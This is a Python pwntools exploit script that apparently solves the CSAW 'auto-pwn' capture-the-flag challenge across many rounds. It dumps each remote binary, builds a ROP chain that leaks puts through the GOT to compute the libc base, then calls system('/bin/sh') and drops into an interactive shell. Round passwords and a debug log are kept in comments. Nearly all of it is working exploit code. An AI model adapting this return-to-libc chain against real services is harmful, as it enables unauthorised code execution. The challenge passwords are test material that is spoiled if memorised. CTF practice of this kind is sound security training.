from pwn import *
import os
import random
import time

libc = ELF('./libc-2.24.so')
context.log_level = "DEBUG"

gs = '''
'''

def start(puerto):
    return remote('auto-pwn.chal.csaw.io',int('110'+str(puerto).zfill(2),10))

def exploit(elf,libc,p,puerto,password):
    p.sendlineafter('> ', password)
    p.recvuntil('-------------------------------------------------------------------')
    p.recvuntil('Proceeding to the challenge...')
    p.recvuntil('Main is at ')
    mAin= int(p.recvline(),16)
    log.info('main')
    print(mAin)
    base_bin=mAin-elf.symbols['main']
    log.info('base bin')
    print(base_bin)
    POP_RDI=next(elf.search(asm("pop rdi; ret")))+base_bin
    log.info('POP_RDI')
    print(POP_RDI)
    PUTS=elf.symbols['puts']+base_bin
    p.sendline(b'A'*9+p64(POP_RDI)+p64(elf.got['puts']+base_bin)+p64(PUTS)+p64(mAin))
    leak_libc=p.recv(7)+b'\x00'
    leak_libc=[ hex(x) for x in list(leak_libc) ][:-2]
    leak_libc= int('0x'+("".join(leak_libc[5]+leak_libc[4]+leak_libc[3]+leak_libc[2]+leak_libc[1]+leak_libc[0]).replace('0x','')),16)
    #puede fallar cuando una direccion sea solo 0x7
    libc.address=leak_libc-libc.symbols['puts']
    log.info('LIBC BASE')
    print(hex(libc.address))
    BINSH = next(libc.search(b"/bin/sh"))
    p.sendlineafter('> ', password)
    p.recvuntil('-------------------------------------------------------------------')
    p.recvuntil('Proceeding to the challenge...')
    p.recvuntil('Main is at ')
    p.sendline(b'A'*9+p64(POP_RDI)+p64(BINSH)+p64(libc.symbols['system'])+p64(mAin))
    p.interactive()
    # p.sendline('cat message.txt')
    # password=get_message(p)
    # return password


def dump_binary(puerto, password):
    p=start(puerto)
    p.sendlineafter('> ', password)
    p.recvuntil('-------------------------------------------------------------------')
    p.recvuntil('Proceeding to the challenge...')
    p.recvuntil('Main is at ')
    mAin= int(p.recvline(),16)
    p.sendline(b'A'*9+p64(mAin))
    p.sendlineafter('> ', password)
    p.recvuntil("-------------------------------------------------------------------\n")
    dump=p.recvuntil('-------------------------------------------------------------------\n')
    f=open(f"binary_{puerto}.txt","wb")
    f.write(dump)
    os.system(f'xxd -r binary_{puerto}.txt binary_{puerto}')



def get_message(p):
    p.sendline('cat message.txt')
    sleep(3)
    try:
        p.recvuntil('Sorry, but your flag is in another box!')
        p.recvuntil('and use password ')
    except:
        p.interactive
    linea=p.recvline()
    log.info('linea')
    print(linea)
    return linea[:-1]

# def round(puerto,password):
#     dump_binary(puerto)
#     elf=ELF(f'./binary_{puerto}')
#     p=start(puerto)
#     dump_binary(puerto)


######################################################
# p=start(1)
# dump_binary(1,"8d16635db965bc4e0a97521e8105fad2")
# context.binary =f'./binary_1'
# elf=context.binary
# exploit(elf,libc,p,1,"8d16635db965bc4e0a97521e8105fad2")


# p=start(2)
# dump_binary(2,"5ba73db3117a885aaa3c80ebe4ec603e")
# context.binary =f'./binary_2'
# elf=context.binary
# exploit(elf,libc,p,2,"5ba73db3117a885aaa3c80ebe4ec603e")

# p=start(3)
# dump_binary(3,"d4e32a79d4597bb10a5ba69aaf8689e3")
# context.binary =f'./binary_3'
# elf=context.binary
# exploit(elf,libc,p,3,"d4e32a79d4597bb10a5ba69aaf8689e3")

# p=start(4)
# dump_binary(4,"6a4075dc8cd20edc6146f91b7e42684c")
# context.binary =f'./binary_4'
# elf=context.binary
# exploit(elf,libc,p,4,"6a4075dc8cd20edc6146f91b7e42684c")

# p=start(5)
# dump_binary(5,"05d618e1dc560b4a84c3371525c7e2d1")
# context.binary =f'./binary_5'
# elf=context.binary
# exploit(elf,libc,p,5,"05d618e1dc560b4a84c3371525c7e2d1")

# p=start(6)
# dump_binary(6,"d2f5718673f78494d2d172b1fe9e5d6c")
# context.binary =f'./binary_6'
# elf=context.binary
# exploit(elf,libc,p,6,"d2f5718673f78494d2d172b1fe9e5d6c")

# p=start(7)
# dump_binary(7,"1eb2463f80b9b81f868007d49479b8b8")
# context.binary =f'./binary_7'
# elf=context.binary
# exploit(elf,libc,p,7,"1eb2463f80b9b81f868007d49479b8b8")

rrr=21
pzw="13462b403d91edd8c8389517c1eca3ed"
p=start(rrr)
dump_binary(rrr,pzw)
context.binary =f'./binary_{rrr}'
elf=context.binary
exploit(elf,libc,p,rrr,pzw)

# 8d16635db965bc4e0a97521e8105fad2
# 5ba73db3117a885aaa3c80ebe4ec603e
# d4e32a79d4597bb10a5ba69aaf8689e3
# 6a4075dc8cd20edc6146f91b7e42684c
# 05d618e1dc560b4a84c3371525c7e2d1\n
# d2f5718673f78494d2d172b1fe9e5d6c\n
# 1eb2463f80b9b81f868007d49479b8b8\n
# 942bf6a59242d014736e056aa9b5a61f
# 930f8b14dc3a2c7645bc572920469fe6\n
# ba41eaf361c65c536c4780f86b886003\n
# d38caab88089f49fec5a483804407b60\n
# d0e4746d3ae45cfad33552dd36b4e194\n
# e042a30077c6bc66146838f7b00506e3\n
# 007e5be15fbbead1ffb6d388e827c23a\n
# 2e0427a53d33dc48e3e3856552328265\n
# 836e8564c5d94de7c61cff04e8b027c4\n
# 551d8e3265626d426fb79174c9f9312b\n
# 0ddded9a55029fdc68a9c4b0b3b949d9\n
# e8003fc36aa0b5abbf48d5b764de9080\n
# 0e66a25c5002764ccf67139a851d0cb8\n 20
# 13462b403d91edd8c8389517c1eca3ed\n


# log.info('password')
# print(password)
p.close()

# p=start(1)
# dump_binary(1,"8d16635db965bc4e0a97521e8105fad2")
# context.binary =f'./binary_1'
# elf=context.binary
# password=exploit(elf,libc,p,1,"8d16635db965bc4e0a97521e8105fad2")
# log.info('password')
# print(password)
# p.close()

# puerto=2
# while(1):
#     try:
#         os.system('clear')
#         log.info(f'puerto 110{puerto}')
#         log.info('password')
#         print(password)
#         if puerto>5:
#             break
#         pause()
#         log.info('START...')
#         p=start(puerto)
#         log.info('STARTED')
#         log.info('DUMPING')
#         dump_binary(puerto,password)
#         log.info('DUMPED')
#         pause()
#         context.binary =f'./binary_{puerto}'
#         elf=context.binary
#         password=exploit(elf,libc,p,puerto,password)
#         log.info('password')
#         print(password)
#         p.close()
#         puerto=puerto+1
#     except:
#         sleep(3)


# [DEBUG] Received 0x79 bytes:
#     b'Sorry, but your flag is in another box! nc auto-pwn.chal.csaw.io 11003 and use password d4e32a79d4597bb10a5ba69aaf8689e3\n'
# Sorry, but your flag is in another box! nc auto-pwn.chal.csaw.io 11003 and use password d4e32a79d4597bb10a5ba69aaf8689e3
# $ 


# 5ba73db3117a885aaa3c80ebe4ec603e